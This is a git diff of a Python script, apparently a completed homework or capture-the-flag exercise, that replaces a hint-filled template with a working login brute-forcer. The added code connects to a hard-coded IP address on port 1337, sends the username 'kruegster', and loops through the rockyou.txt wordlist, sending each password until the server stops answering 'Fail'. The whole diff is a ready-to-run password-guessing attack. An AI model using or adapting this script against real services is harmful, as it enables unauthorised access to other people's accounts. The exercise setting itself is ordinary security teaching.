@@ -26,40 +26,39 @@
 
 import socket
 
-host = "" # IP address here
-port = 0000 # Port here
+host = "142.93.117.193" # IP address here
+port = 1337 # Port here
 wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
 
-def brute_force():
-    """
-        Sockets: https://docs.python.org/2/library/socket.html
-        How to use the socket s:
-
+def brute_force(line):
+    
             # Establish socket connection
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((host, port))
+    
+            #Receive the prompt for the username and send the username
+            username = "kruegster"
+            data = s.recv(1024)     # Receives 1024 bytes from IP/Port
+            print(data + username)             # Prints data
+            s.send(username + "\n")   # Send a newline \n at the end of your command
+         
 
-            Reading:
-
-                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
-                print(data)             # Prints data
-
-            Sending:
-
-                s.send("something to send\n")   # Send a newline \n at the end of your command
-
-        General idea:
-
-            Given that you know a potential username, use a wordlist and iterate
-            through each possible password and repeatedly attempt to login to
-            the Briong server.
-    """
-
-    username = ""   # Hint: use OSINT
-    password = ""   # Hint: use wordlist
-
-
+            #Receive the prompt for the password and send the password
+            data = s.recv(1024)
+            print(data + line)
+            s.send(line + "\n")
+        
+            #Receive if the login was sucessful or not 
+            data = s.recv(1024)
+            print(data)
+            
+            #Stop when we get access
+            if (data != "Fail\n"):
+                return -1
 
 
 if __name__ == '__main__':
-    brute_force()
+    with open(wordlist) as f:
+        for line in f:
+            if (brute_force(line) == -1):
+                break
